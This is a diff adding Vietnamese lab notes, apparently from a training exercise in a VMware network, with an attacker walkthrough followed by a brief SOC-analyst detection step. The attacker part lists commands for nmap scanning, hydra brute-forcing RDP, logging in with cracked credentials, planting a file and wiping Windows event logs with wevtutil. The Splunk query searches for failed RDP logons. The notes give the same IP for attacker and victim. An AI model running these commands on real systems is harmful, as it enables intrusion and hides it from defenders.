@@ -1,0 +1,46 @@
+Thực hành:
+
+Hacker:
+
+B1: kiểm tra địa chỉ ip máy của mình ( tìm dải mạng)
+hostname -I ( kết quả: ip máy của hacker là 192.168.188.129)
+B2: thực hiện nmap để quét các thiết bị:
+nmap -sn 192.168.188.0/24
+-> phát hiện máy nạn nhân:
+IPv4: 192.168.188.129
+MAC: 00:0C:29:F0:EE:22 (VMware)
+
+B3: quét 100 cổng phổ biến của thiết bị 192.168.188.129
+nmap -F 192.168.188.129
+-> phat hiện cổng 3389 mở (RDP đang đc mở)-> có thể thực hiện tấn công
+
+B4: chạy lệnh hydra để tấn công
+hydra -l trungdh -P passwords.txt rdp://192.168.188.129
+-> brute-force thành công: username: trungdh - password: 123456
+
+B5: truy cập account = rdp  với ip, username, password
+xfreerdp /v:192.168.188.129 /u:trungdh /p:123456
+
+B6. khi truy cập thành công-> tài lên file hacked.txt từ máy hacker.
+copy file hacked.txt-> máy nạn nhân: C:\Users\TrungDH\Documents
+
+B7. xóa log
+# Xóa toàn bộ Security Log
+wevtutil cl Security
+
+# Hoặc xóa System Log
+wevtutil cl System
+
+# Xóa Application Log
+wevtutil cl Application
+B8. Đăng xuất khỏi máy nạn nhân
+cmd: logoff
+
+
+SOC Analyst:
+B1. Mở Splunk
+B2: vào mục search & Reporting
+B3: truy vấn tìm log đăng nhập thất bại RDP				
+index=main EventCode=4625 Logon_Type=3
+
+
